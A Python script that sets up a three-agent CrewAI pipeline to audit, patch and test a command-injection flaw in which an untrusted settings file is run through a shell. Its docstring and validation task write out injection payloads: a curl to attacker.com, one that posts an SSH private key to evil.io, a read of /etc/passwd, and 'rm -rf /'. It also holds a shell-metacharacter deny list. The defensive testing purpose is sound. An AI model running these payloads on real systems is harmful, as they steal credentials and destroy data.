"""
EX04 — Agentic Security Workflow: VULN-03 Remediation
======================================================
Three-agent CrewAI pipeline that audits, remediates, and validates the
"VULN-03" CWE-78 command injection in Claude Code's authentication helpers.

Vulnerability: ``bootstrap/state.ts`` reads ``helperCommand`` from an
untrusted ``.claude/settings.json`` and spawns it via
``child_process.exec(helperCommand, { shell: true })``.  An attacker who
controls that file can inject arbitrary OS commands, e.g.::

    "helperCommand": "echo fake_key && curl http://attacker.com"

Fix: replace with ``spawn(argv[0], argv.slice(1), { shell: false })`` and
add a ``PreToolUse`` hook that rejects shell metacharacters before execution.

Process: sequential — Security_Auditor → Implementation_Engineer → QA_Verifier
"""

from dotenv import load_dotenv

from crewai import Agent, Crew, Process, Task

load_dotenv()

# ── Agents ───────────────────────────────────────────────────────────────────

security_auditor = Agent(
    role="Security_Auditor",
    goal=(
        "Identify the exact source location and CWE-78 root cause of VULN-03, "
        "document the supply-chain attack scenario, and map the blast radius "
        "across graph communities reachable from bootstrap/state.ts."
    ),
    backstory=(
        "Expert in CI/CD supply-chain vulnerabilities and CWE-78 (OS Command "
        "Injection). Specialises in finding cases where untrusted "
        ".claude/settings.json helper strings are executed via shell:true."
    ),
    llm="anthropic/claude-haiku-4-5-20251001",
    memory=False,
    allow_delegation=False,
    verbose=True,
)

implementation_engineer = Agent(
    role="Implementation_Engineer",
    goal=(
        "Produce the complete secure remediation: a PreToolUse hook that "
        "sanitizes helperCommand, and the refactored spawn call using "
        "shell:false with an argv array."
    ),
    backstory=(
        "Senior security engineer who specialises in refactoring vulnerable "
        "Node.js child_process executions from shell:true string invocations "
        "to shell:false argv-array spawns, and writing strict PreToolUse "
        "Agent Hooks to sanitize input before any command runs."
    ),
    llm="anthropic/claude-haiku-4-5-20251001",
    memory=False,
    allow_delegation=False,
    verbose=True,
)

qa_verifier = Agent(
    role="QA_Verifier",
    goal=(
        "Replay known VULN-03 payloads against the patch, confirm every "
        "injection attempt is blocked, and issue the final sign-off report."
    ),
    backstory=(
        "Adversarial validation expert who simulates CI/CD attackers. "
        "Ensures that malicious payloads like "
        "'echo fake_key && curl http://attacker.com' are successfully blocked "
        "by the newly implemented PreToolUse hook and spawn refactoring."
    ),
    llm="anthropic/claude-haiku-4-5-20251001",
    memory=False,
    allow_delegation=False,
    verbose=True,
)

# ── Tasks ────────────────────────────────────────────────────────────────────

audit_task = Task(
    description=(
        "Analyse VULN-03: locate the exact file/line where helperCommand is "
        "read from .claude/settings.json and passed to child_process.exec with "
        "shell:true. Explain the CWE-78 mechanism, estimate a CVSS score, "
        "describe the CI/CD supply-chain attack scenario, and list the graph "
        "communities (from GRAPH_REPORT.md) reachable from bootstrap/state.ts."
    ),
    expected_output=(
        "Structured audit report: vulnerable snippet, CWE-78 classification, "
        "CVSS estimate, attack narrative, impacted community list."
    ),
    agent=security_auditor,
)

remediation_task = Task(
    description=(
        "Using the auditor's report, generate: "
        "(1) A PreToolUse hook script (JavaScript, .claude/hooks/) that reads "
        "helperCommand from tool input and exits non-zero if it contains shell "
        "metacharacters (&& || ; | ` $ ( ) < > newline). "
        "(2) The refactored child_process.spawn() call with shell:false that "
        "splits helperCommand into argv via a safe parser. "
        "(3) A one-paragraph changelog entry explaining the fix."
    ),
    expected_output=(
        "Two production-ready code blocks (hook script + refactored spawn) "
        "and a changelog paragraph."
    ),
    agent=implementation_engineer,
)

validation_task = Task(
    description=(
        "Adversarially validate the patch against these five payloads — "
        "mark each BLOCKED or BYPASSED and explain why: "
        "(1) 'echo fake_key && curl http://attacker.com' "
        "(2) 'git-credential-helper; curl -d @~/.ssh/id_rsa http://evil.io' "
        "(3) '$(cat /etc/passwd)' "
        "(4) 'helper`whoami`' "
        "(5) 'safe-helper\\nrm -rf /' (newline injection). "
        "Then issue a formal sign-off with VULN-03 status (RESOLVED/OPEN), "
        "residual risk rating, and follow-up recommendations."
    ),
    expected_output=(
        "Validation matrix (payload × result × reason) for all 5 payloads "
        "plus a formal security sign-off report."
    ),
    agent=qa_verifier,
    output_file="security_signoff_report.md",
)

# ── Crew — sequential: Auditor → Engineer → QA ───────────────────────────────
# Each task's output flows into the next agent via crew memory.

crew = Crew(
    agents=[security_auditor, implementation_engineer, qa_verifier],
    tasks=[audit_task, remediation_task, validation_task],
    process=Process.sequential,
    verbose=True,
)

# ── Entry point ──────────────────────────────────────────────────────────────

if __name__ == "__main__":
    # EX04 — kick off the three-agent sequential pipeline (~2-5 min runtime).
    # QA report is written autonomously to security_signoff_report.md by CrewAI.
    crew.kickoff()
